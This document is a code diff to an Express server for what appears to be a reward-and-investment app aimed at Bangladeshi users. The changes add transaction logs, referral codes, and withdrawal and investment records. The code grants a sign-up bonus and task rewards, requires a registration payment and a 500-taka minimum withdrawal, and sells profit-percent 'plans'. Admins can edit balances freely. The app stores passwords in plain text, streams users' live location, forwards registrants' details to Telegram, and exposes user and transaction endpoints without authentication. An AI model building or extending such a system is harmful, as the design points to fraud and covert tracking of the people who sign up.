@@ -33,11 +33,13 @@ function defaultDb() {
     usedNumbers: [],
     withdrawals: [],
     investments: [],
+    transactions: [],
+    notifications: [],
     settings: { telegramChatId: "", telegramBotTokenEncrypted: "" },
     tasks: [
-      { id: "task_1", title: "Daily Check-in", reward: 20, type: "daily" },
-      { id: "task_2", title: "Referral Bonus", reward: 50, type: "referral" },
-      { id: "task_3", title: "Visit Promo Link", reward: 30, type: "visit" }
+      { id: "task_1", title: "Daily Check-in", description: "প্রতিদিন লগইন করে নিন ফ্রি রিওয়ার্ড", reward: 20, type: "daily" },
+      { id: "task_2", title: "Visit Promo Link", description: "প্রোমো ওয়েবসাইট ভিজিট করুন", reward: 30, type: "visit" },
+      { id: "task_3", title: "Referral Bonus", description: "বন্ধুদের সাথে শেয়ার করুন", reward: 50, type: "referral" }
     ]
   };
 }
@@ -55,6 +57,8 @@ function loadDb() {
       usedNumbers: Array.isArray(parsed.usedNumbers) ? parsed.usedNumbers : [],
       withdrawals: Array.isArray(parsed.withdrawals) ? parsed.withdrawals : [],
       investments: Array.isArray(parsed.investments) ? parsed.investments : [],
+      transactions: Array.isArray(parsed.transactions) ? parsed.transactions : [],
+      notifications: Array.isArray(parsed.notifications) ? parsed.notifications : [],
       settings: {
         telegramChatId: parsed.settings?.telegramChatId || "",
         telegramBotTokenEncrypted: parsed.settings?.telegramBotTokenEncrypted || ""
@@ -207,7 +211,7 @@ function rateLimitAdminLogin(req, res, next) {
 app.use(express.json({ limit: "100kb" }));
 app.use(express.static(path.join(__dirname, "public")));
 
-// 1. User Registration Route
+// 1. Register Start
 app.post("/api/register/start", (req, res) => {
   withFileLock(async () => {
     const name = clean(req.body?.name, 80);
@@ -240,7 +244,9 @@ app.post("/api/register/start", (req, res) => {
       phone,
       password,
       age,
-      balance: 100, // একাউন্ট খুললেই ১০০ টাকা বোনাস
+      balance: 100,
+      totalEarned: 100,
+      referralCode: "REF" + Math.floor(100000 + Math.random() * 900000),
       location: { latitude: lat, longitude: lon, accuracy: acc || null, capturedAt: createdAt },
       locationHistory: [{ latitude: lat, longitude: lon, accuracy: acc || null, capturedAt: createdAt }],
       completedTasks: [],
@@ -252,12 +258,20 @@ app.post("/api/register/start", (req, res) => {
     };
 
     db.registrations.unshift(userObj);
+    db.transactions.unshift({
+      id: crypto.randomUUID(),
+      userId: id,
+      type: "Welcome Bonus",
+      amount: 100,
+      status: "Success",
+      date: createdAt
+    });
     saveDb(db);
     res.json({ ok: true, user: userObj });
   });
 });
 
-// 2. User Login Route
+// 2. Login Route
 app.post("/api/login", (req, res) => {
   const phone = clean(req.body?.phone, 20);
   const password = clean(req.body?.password, 50);
@@ -279,7 +293,7 @@ app.get("/api/user/:id", (req, res) => {
   res.json({ ok: true, user });
 });
 
-// 3. Live Location Stream Update API Endpoint
+// 3. Live Location Stream Update API
 app.post("/api/user/:id/location", (req, res) => {
   withFileLock(async () => {
     const lat = Number(req.body?.location?.latitude);
@@ -336,7 +350,7 @@ app.post("/api/register/:id/payment", (req, res) => {
     saveDb(db);
 
     const msg = [
-      "✅ New Bonus Registration",
+      "✅ New Professional V2 Registration",
       `Name: ${row.name}`,
       `Phone: ${row.phone}`,
       `Age: ${row.age}`,
@@ -381,13 +395,30 @@ app.post("/api/tasks/claim", (req, res) => {
 
     user.completedTasks.push({ taskId, date: today });
     user.balance = (user.balance || 0) + task.reward;
+    user.totalEarned = (user.totalEarned || 0) + task.reward;
+
+    db.transactions.unshift({
+      id: crypto.randomUUID(),
+      userId,
+      type: `Task Reward (${task.title})`,
+      amount: task.reward,
+      status: "Success",
+      date: new Date().toISOString()
+    });
 
     saveDb(db);
-    res.json({ ok: true, balance: user.balance, reward: task.reward });
+    res.json({ ok: true, balance: user.balance, totalEarned: user.totalEarned, reward: task.reward });
   });
 });
 
 // 6. Withdraw & Investment System APIs
+app.get("/api/transactions/:userId", (req, res) => {
+  const db = loadDb();
+  const txs = db.transactions.filter(t => t.userId === req.params.userId);
+  const wds = db.withdrawals.filter(w => w.userId === req.params.userId);
+  res.json({ ok: true, transactions: txs, withdrawals: wds });
+});
+
 app.post("/api/withdraw", (req, res) => {
   withFileLock(async () => {
     const { userId, method, number, amount } = req.body;
@@ -395,21 +426,32 @@ app.post("/api/withdraw", (req, res) => {
     const user = db.registrations.find(r => r.id === userId);
 
     if (!user) return res.status(404).json({ error: "User not found" });
-    if (Number(amount) > user.balance || Number(amount) < 500) {
+    const numAmount = Number(amount);
+    if (!Number.isFinite(numAmount) || numAmount > user.balance || numAmount < 500) {
       return res.status(400).json({ error: "সর্বনিম্ন উইথড্র ৳৫০০ এবং পর্যাপ্ত ব্যালেন্স থাকতে হবে।" });
     }
 
-    user.balance -= Number(amount);
+    user.balance -= numAmount;
+    const wdId = crypto.randomUUID();
     db.withdrawals.unshift({
-      id: crypto.randomUUID(),
+      id: wdId,
       userId,
       userName: user.name,
       userPhone: user.phone,
       method,
       number,
-      amount: Number(amount),
+      amount: numAmount,
       status: "Pending",
       createdAt: new Date().toISOString()
+    });
+
+    db.transactions.unshift({
+      id: crypto.randomUUID(),
+      userId,
+      type: `Withdraw Request (${method})`,
+      amount: -numAmount,
+      status: "Pending",
+      date: new Date().toISOString()
     });
 
     saveDb(db);
@@ -423,19 +465,29 @@ app.post("/api/invest", (req, res) => {
     const db = loadDb();
     const user = db.registrations.find(r => r.id === userId);
 
-    if (!user || Number(amount) > user.balance || Number(amount) < 100) {
+    const numAmount = Number(amount);
+    if (!user || !Number.isFinite(numAmount) || numAmount > user.balance || numAmount < 100) {
       return res.status(400).json({ error: "পর্যাপ্ত ব্যালেন্স নেই (সর্বনিম্ন ইনভেস্ট ৳১০০)" });
     }
 
-    user.balance -= Number(amount);
+    user.balance -= numAmount;
     db.investments.unshift({
       id: crypto.randomUUID(),
       userId,
       planDays,
       profitPercent,
-      amount: Number(amount),
+      amount: numAmount,
       status: "Active",
       createdAt: new Date().toISOString()
+    });
+
+    db.transactions.unshift({
+      id: crypto.randomUUID(),
+      userId,
+      type: `Investment Plan (${planDays} Days)`,
+      amount: -numAmount,
+      status: "Success",
+      date: new Date().toISOString()
     });
 
     saveDb(db);
@@ -491,7 +543,6 @@ app.delete("/api/admin/registrations/:id", requireAdmin, (req, res) => {
   });
 });
 
-// Admin User Balance Edit System
 app.post("/api/admin/user/update-balance", requireAdmin, (req, res) => {
   withFileLock(async () => {
     const { userId, newBalance } = req.body;
@@ -531,7 +582,7 @@ app.post("/api/admin/settings", requireAdmin, (req, res) => {
 });
 
 app.post("/api/admin/telegram/test", requireAdmin, async (req, res) => {
-  const result = await sendTelegram("🔔 Test Message: Telegram Integration Successfully Configured!");
+  const result = await sendTelegram("🔔 Test Message: Professional V2 Telegram Integration Successfully Configured!");
   if (!result.ok) {
     return res.status(400).json({ error: result.error || "Telegram message send failed" });
   }
